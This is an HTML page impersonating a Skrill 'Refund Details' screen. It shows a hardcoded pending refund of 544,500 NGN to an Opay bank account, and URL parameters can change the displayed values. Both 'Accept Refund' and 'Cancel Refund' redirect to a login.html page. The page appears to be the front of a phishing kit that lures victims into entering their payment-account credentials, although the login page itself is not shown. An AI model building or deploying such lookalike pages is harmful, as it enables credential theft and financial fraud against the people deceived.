<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Skrill — Refund</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet" />

    <style>
         :root {
            --surface: #ffffff;
            --muted: #6b7280;
            --border: #e9ecef;
            --sk-purple-1: #180216;
            --sk-purple-2: #642b61a1;
            --sk-purple-3: #751270d2;
            --sk-violet-dark: #cb0fd154;
            --bg: #ece9ff;
            --success-bg: #efe7ff;
            --success-text: #4b00cc;
            --warning-bg: #fff3d6;
            --warning-text: #0dc90d;
        }
        
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(160deg, #f8f7ff 0%, #eef1ff 100%);
            min-height: 100vh;
        }
        
        .page-wrap {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem 1rem;
        }
        
        .trade-card {
            width: 100%;
            max-width: 480px;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(106, 0, 255, 0.1);
            overflow: hidden;
            animation: slideUp 0.5s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .card-header-custom {
            padding: 1.35rem 1.75rem 0;
            text-align: center;
        }
        
        .brand {
            color: #6a00ff;
            font-weight: 800;
            font-style: italic;
            font-family: Georgia, "Times New Roman", serif;
            letter-spacing: -0.6px;
        }
        
        .hero {
            margin: 1rem 0 0;
            background: linear-gradient(180deg, var(--sk-purple-1) 0%, var(--sk-purple-2) 55%, var(--sk-purple-3) 100%);
            height: 365px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            border-radius: 0;
        }
        
        .hero-inner {
            width: 100%;
            padding: 0 36px;
        }
        
        .check-circle {
            width: 120px;
            height: 120px;
            border-radius: 999px;
            background: rgba(255, 255, 255, 0.16);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 26px;
            box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.08);
        }
        
        .check-circle svg {
            width: 64px;
            height: 64px;
            filter: drop-shadow(0 6px 14px rgba(0, 0, 0, 0.18));
        }
        
        .hero-title {
            margin: 0;
            color: #fff;
            font-weight: 800;
            font-size: 56px;
            letter-spacing: 0.3px;
            line-height: 1.05;
            text-shadow: 0 6px 20px rgba(35, 0, 92, 0.18);
        }
        
        .hero-subtitle {
            margin: 14px 0 30px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 26px;
            font-weight: 500;
        }
        /* ===== UPDATED: centered and violet coloring for the "Skrill" method ===== */
        
        .method {
            display: flex;
            align-items: center;
            justify-content: center;
            /* center horizontally */
            gap: 18px;
            margin-top: 10px;
            text-align: center;
        }
        
        .skrill-mark {
            width: 52px;
            height: 44px;
            /* violet base */
            background: linear-gradient(180deg, var(--sk-purple-1) 0%, var(--sk-purple-2) 100%);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 12px 26px rgba(55, 0, 120, 0.25), inset 0 0 0 1px rgba(255, 255, 255, 0.15);
            position: relative;
            overflow: hidden;
        }
        
        .skrill-mark::before,
        .skrill-mark::after {
            content: "";
            position: absolute;
            width: 22px;
            height: 22px;
            background: #ffffff;
            transform: rotate(45deg);
            opacity: 0.95;
            border-radius: 4px;
        }
        
        .skrill-mark::before {
            left: 9px;
            top: 8px;
        }
        
        .skrill-mark::after {
            right: 9px;
            top: 8px;
            opacity: 0.9;
        }
        
        .skrill-flare {
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, rgba(223, 24, 189, 0.884), rgba(238, 28, 210, 0.692));
            mix-blend-mode: overlay;
            pointer-events: none;
        }
        
        .method-name {
            /* violet text */
            color: var(--sk-pink);
            font-size: 44px;
            font-weight: 900;
            letter-spacing: 0.2px;
            text-shadow: 0 2px 10px rgba(221, 109, 212, 0.18);
            line-height: 1;
        }
        /* bottom white separator / area like image crop */
        
        .hero-bottom-spacer {
            height: 1px;
            background: rgba(255, 255, 255, 0.35);
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
        }
        
        @media (max-width: 520px) {
            .hero {
                height: 330px;
            }
            .hero-title {
                font-size: 44px;
            }
            .hero-subtitle {
                font-size: 20px;
                margin-bottom: 24px;
            }
            .check-circle {
                width: 104px;
                height: 104px;
                margin-bottom: 18px;
            }
            .method-name {
                font-size: 34px;
            }
        }
        /* ===== Body ===== */
        
        .card-body-custom {
            padding: 1.5rem 1.75rem 1.75rem;
        }
        
        .reminder-text {
            color: var(--muted);
            font-size: 0.9rem;
            line-height: 1.5;
            margin-bottom: 1.25rem;
        }
        
        .detail-list {
            background: #f8f9ff;
            border-radius: 14px;
            padding: 0.25rem 0;
            margin-bottom: 1.25rem;
        }
        
        .detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.85rem 1.15rem;
            border-bottom: 1px solid var(--border);
            gap: 1rem;
        }
        
        .detail-row:last-child {
            border-bottom: none;
        }
        
        .detail-label {
            color: var(--muted);
            font-size: 0.85rem;
            flex-shrink: 0;
        }
        
        .detail-value {
            font-weight: 650;
            color: #111827;
            text-align: right;
            word-break: break-word;
        }
        
        .detail-value.amount {
            color: #111827;
            font-size: 1.05rem;
        }
        
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.35rem;
            padding: 0.3rem 0.65rem;
            border-radius: 999px;
            font-size: 0.78rem;
            font-weight: 700;
            text-transform: capitalize;
        }
        
        .status-badge.complete {
            background: var(--success-bg);
            color: var(--success-text);
        }
        
        .status-badge.waiting {
            background: var(--warning-bg);
            color: var(--warning-text);
        }
        
        .btn-confirm {
            background: #6a00ff;
            border: none;
            color: #fff;
            font-weight: 800;
            padding: 0.75rem;
            border-radius: 10px;
            transition: background 0.2s, transform 0.05s;
            box-shadow: 0 10px 18px rgba(106, 0, 255, 0.18);
        }
        
        .btn-confirm:hover {
            background: var(--sk-purple-dark);
            color: #fff;
        }
        
        .btn-cancel {
            background: transparent;
            border: 1px solid rgba(106, 0, 255, 0.25);
            color: #4b5563;
            font-weight: 800;
            padding: 0.75rem;
            border-radius: 10px;
            transition: background 0.2s, border-color 0.2s, color 0.2s;
        }
        
        .btn-cancel:hover {
            background: #f2edff;
            border-color: rgba(106, 0, 255, 0.45);
            color: #111827;
        }
    </style>
</head>

<body>
    <div class="page-wrap">
        <div class="trade-card">
            <!-- UPDATED: centered + violet method -->
            <div class="method" aria-label="Method">
                <div class="skrill-mark" aria-hidden="true">
                    <span class="skrill-flare"></span>
                </div>
                <div class="method-name">Skrill</div>
            </div>

            <div class="hero" role="region" aria-label="Refund Details Banner">
                <div class="hero-inner">
                    <div class="check-circle" aria-hidden="true">
                        <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path
                d="M26.2 42.7 14.6 31.1c-1.3-1.3-3.4-1.3-4.7 0s-1.3 3.4 0 4.7l14.1 14.1c1.3 1.3 3.4 1.3 4.7 0L56.6 24.5c1.3-1.3 1.3-3.4 0-4.7s-3.4-1.3-4.7 0L26.2 42.7Z"
                fill="#ffffff" />
            </svg>
                    </div>

                    <h1 class="hero-title">Refund Details</h1>
                    <p class="hero-subtitle">Please review the information below</p>
                </div>

                <div class="hero-bottom-spacer" aria-hidden="true"></div>
            </div>

            <div class="card-body-custom">
                <p class="reminder-text">
                    <strong>Refund Informations</strong>
                </p>

                <div class="detail-list">
                    <div class="detail-row">
                        <span class="detail-label">Account for Refund</span>
                        <span class="detail-value" id="paymentMethod">—</span>
                    </div>

                    <div class="detail-row">
                        <span class="detail-label">Refund ID</span>
                        <span class="detail-value" id="tradeId">—</span>
                    </div>

                    <div class="detail-row">
                        <span class="detail-label">Refund Amount</span>
                        <span class="detail-value amount" id="amount">—</span>
                    </div>

                    <div class="detail-row">
                        <span class="detail-label">Status</span>
                        <span class="detail-value" id="statusWrap">
              <span class="status-badge waiting" id="statusBadge">
                <i class="fas fa-clock"></i>
                <span id="statusText">Pending Refund</span>
                        </span>
                        </span>
                    </div>
                </div>

                <div class="d-grid gap-2">
                    <button type="button" class="btn btn-confirm" id="confirmBtn">
            <i class="fas fa-check me-2"></i>Accept Refund
          </button>

                    <button type="button" class="btn btn-cancel" id="cancelBtn">
            <i class="fas fa-times me-2"></i>Cancel Refund
          </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const DEFAULT_TRADE = {
            tradeId: "TR-674116",
            amount: "544,500.00NGN",
            paymentMethod: "Opay Bank -8149905389",
            status: "waiting", // "waiting" | "complete"
        };

        function normalizeStatus(status) {
            const value = (status || "").toLowerCase().trim();
            if (
                value === "complete" ||
                value === "transfer complete" ||
                value === "completed"
            )
                return "complete";
            return "waiting";
        }

        function mergeTrade(base) {
            const params = new URLSearchParams(window.location.search);
            return {
                tradeId: params.get("tradeId") || base.tradeId || DEFAULT_TRADE.tradeId,
                amount: params.get("amount") || base.amount || DEFAULT_TRADE.amount,
                paymentMethod: params.get("method") ||
                    params.get("paymentMethod") ||
                    base.paymentMethod ||
                    DEFAULT_TRADE.paymentMethod,
                status: params.get("status") || base.status || DEFAULT_TRADE.status,
            };
        }

        function renderTrade(trade) {
            document.getElementById("paymentMethod").textContent =
                trade.paymentMethod;
            document.getElementById("tradeId").textContent = trade.tradeId;
            document.getElementById("amount").textContent = trade.amount;

            const badge = document.getElementById("statusBadge");
            const statusText = document.getElementById("statusText");
            const normalized = normalizeStatus(trade.status);

            badge.classList.remove("complete", "waiting");

            if (normalized === "complete") {
                badge.classList.add("complete");
                badge.querySelector("i").className = "fas fa-check-circle";
                statusText.textContent = "Transfer Complete";
            } else {
                badge.classList.add("waiting");
                badge.querySelector("i").className = "fas fa-clock";
                statusText.textContent = "Waiting Confirmation";
            }
        }

        function goToLogin(action, trade) {
            const params = new URLSearchParams({
                action: action,
                tradeId: trade.tradeId,
                amount: trade.amount,
                method: trade.paymentMethod,
                status: normalizeStatus(trade.status),
            });
            window.location.href = `login.html?${params.toString()}`;
        }

        async function loadTrade() {
            let fromFile = {};
            for (const url of["/api/trade-public", "/trade-config.json"]) {
                try {
                    const res = await fetch(url + "?_=" + Date.now(), {
                        cache: "no-store",
                    });
                    if (res.ok) {
                        fromFile = await res.json();
                        break;
                    }
                } catch (e) {}
            }
            return mergeTrade(fromFile);
        }

        loadTrade().then((trade) => {
            renderTrade(trade);
            document.getElementById("confirmBtn").addEventListener("click", () =>
                goToLogin("confirm", trade)
            );
            document.getElementById("cancelBtn").addEventListener("click", () =>
                goToLogin("cancel", trade)
            );
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
